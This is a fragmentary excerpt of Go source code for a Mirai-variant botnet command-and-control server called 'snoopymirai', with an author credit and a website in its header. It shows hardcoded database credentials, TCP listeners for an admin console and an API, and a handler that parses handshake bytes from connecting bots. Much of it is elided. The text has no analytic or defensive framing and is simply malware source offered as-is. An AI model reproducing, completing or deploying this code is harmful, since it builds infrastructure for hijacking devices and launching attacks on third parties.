...
/*
This is snoopymirai coded by zzmap
@zzmapp
Https://snoopy.sh
*/

const DatabaseAddr string = "192.168.1.122" //127.0.0.1
const DatabaseUser string = "root"
const DatabasePass string = "root1" //root root
...
func main() {
	tel, err := net.Listen("tcp", "192.168.1.122:1337")
	if err != nil {
		fmt.Println(err)
		return
	}

	api, err := net.Listen("tcp", "192.168.1.122:44115")
	if err != nil {
		fmt.Println(err)
		return
	}
	...
	//stops allowing connections via bins
...
func initialHandler(conn net.Conn) {
	...
	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			...
			/* enabling this could cause problems with bots connecting*/
		}
	} else {
